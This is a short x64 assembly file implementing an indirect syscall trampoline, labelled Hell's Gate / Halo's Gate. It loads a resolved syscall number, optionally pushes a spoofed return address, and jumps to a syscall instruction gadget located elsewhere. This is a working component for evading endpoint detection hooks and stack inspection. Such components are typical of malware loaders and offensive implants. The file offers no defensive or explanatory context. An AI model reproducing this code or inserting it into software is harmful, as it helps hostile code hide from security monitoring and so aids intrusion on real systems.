# x64 indirect syscall trampoline (Hell's Gate / Halo's Gate).
    .extern g_syscall_ssn
    .extern g_syscall_gadget
    .extern g_spoof_return_addr

    .text
    .globl syscall_trampoline
syscall_trampoline:
    mov %rcx, %r10
    mov g_syscall_ssn(%rip), %eax
    mov g_spoof_return_addr(%rip), %r11
    test %r11, %r11
    jz 1f
    pushq %r11
1:
    jmp *g_syscall_gadget(%rip)
